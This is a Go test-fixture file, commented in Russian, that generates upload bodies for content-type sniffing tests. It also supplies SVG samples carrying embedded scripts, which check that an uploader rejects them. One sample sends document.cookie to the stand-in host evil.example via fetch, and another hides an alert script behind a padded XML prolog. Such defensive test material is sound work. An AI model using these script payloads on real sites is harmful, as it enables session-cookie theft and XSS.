package objectstoretest

import "bytes"

// Корпус для тестов приёма: заголовки настоящих форматов, дополненные до
// нужной длины. Живёт в <pkg>test, а не в _test.go, потому что тем же корпусом
// пользуются тесты потребителя.
//
// Тела намеренно не являются годными картинками: Uploader смотрит на первые
// SniffLen байт и картинку не декодирует (декодирование — работа imgproxy).

// PNG — тело, которое http.DetectContentType определит как image/png.
func PNG(size int) []byte { return pad([]byte("\x89PNG\r\n\x1a\n"), size) }

// JPEG — тело, которое определится как image/jpeg.
func JPEG(size int) []byte { return pad([]byte("\xff\xd8\xff\xe0"), size) }

// GIF — тело, которое определится как image/gif.
func GIF(size int) []byte { return pad([]byte("GIF89a"), size) }

// WebP — тело, которое определится как image/webp.
func WebP(size int) []byte { return pad([]byte("RIFF\x00\x00\x00\x00WEBPVP"), size) }

// PDF — тело, которое определится как application/pdf.
func PDF(size int) []byte { return pad([]byte("%PDF-1.7\n"), size) }

// Text — обычный текст: тип вне белого списка. Дополняется собой, а не
// нулями: нулевой байт делает тело двоичным, и sniff отдал бы
// application/octet-stream вместо text/plain.
func Text(size int) []byte {
	line := []byte("plain text, nothing to see here\n")
	out := bytes.Clone(line)
	for len(out) < size {
		out = append(out, line...)
	}
	return out[:max(size, len(line))]
}

// SVG — картинка со скриптом: то, ради чего инвариант 3 и написан.
func SVG() []byte {
	return []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">` +
		`<script>fetch("https://evil.example/"+document.cookie)</script></svg>`)
}

// SVGAfterProlog — тот же SVG за XML-прологом, DOCTYPE и длинным комментарием:
// проверка, что отказ не обходится сдвигом тега вглубь файла.
func SVGAfterProlog() []byte {
	return []byte(`<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">` + "\n" +
		"<!-- " + string(bytes.Repeat([]byte("padding "), 20)) + " -->\n" +
		`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)
}

// pad дополняет заголовок нулями до size байт; короче заголовка не бывает.
func pad(head []byte, size int) []byte {
	if size <= len(head) {
		return bytes.Clone(head)
	}
	return append(bytes.Clone(head), make([]byte, size-len(head))...)
}
